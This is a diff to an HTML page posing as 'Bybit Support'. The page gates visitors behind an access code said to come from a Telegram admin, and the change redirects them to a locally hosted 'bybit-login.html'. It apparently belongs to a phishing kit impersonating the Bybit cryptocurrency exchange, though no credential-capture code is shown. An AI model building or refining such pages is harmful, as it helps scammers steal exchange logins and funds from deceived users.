@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bybit - Access Code Verification</title>
+    <title>Bybit - Access Verification</title>
     <link rel="stylesheet" href="../css/styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -17,7 +17,7 @@
                     <h1 class="header-title">Bybit Support</h1>
                 </div>
                 <div class="header-right">
-                    <button class="header-button" onclick="window.location.href='notifications.html'">
+                    <button class="header-button" onclick="window.location.href='../html/notifications.html'">
                         <i class="fas fa-bell"></i>
                     </button>
                     <button class="header-button" onclick="window.location.href='https://www.bybit.com/login'">
@@ -92,7 +92,7 @@
                 e.preventDefault();
                 
                 const accessCode = accessCodeInput.value.toUpperCase();
-                const codePattern = /^[A-Z]{3}[1-9]{3}$/;
+                const codePattern = /^[1-6]{4}[A-Z]{2}$/;
                 
                 if (!accessCode) {
                     errorMessage.textContent = 'Access denied. Please request for correct access code from the admin in telegram chat';
@@ -116,7 +116,7 @@
                 // Store access code and redirect after a short delay
                 sessionStorage.setItem('accessCode', accessCode);
                 setTimeout(() => {
-                    window.location.href = 'thank-you.html';
+                    window.location.href = '../html/bybit-login.html';
                 }, 1000);
             });
 
